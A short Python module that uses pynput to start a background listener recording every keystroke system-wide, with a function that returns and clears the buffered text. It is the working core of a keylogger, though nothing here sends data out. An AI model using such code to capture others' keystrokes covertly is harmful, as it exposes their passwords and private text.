from pynput import keyboard

# Temporary variable to hold keys per minute
logged_keys = []

def on_press(key):
    try:
        logged_keys.append(key.char)
    except AttributeError:
        logged_keys.append(f"[{key}]")

# Start listening in background thread
listener = keyboard.Listener(on_press=on_press)
listener.start()

def get_logged_keys():
    global logged_keys
    typed = ''.join(logged_keys)
    logged_keys = []  # Reset after fetching
    return typed
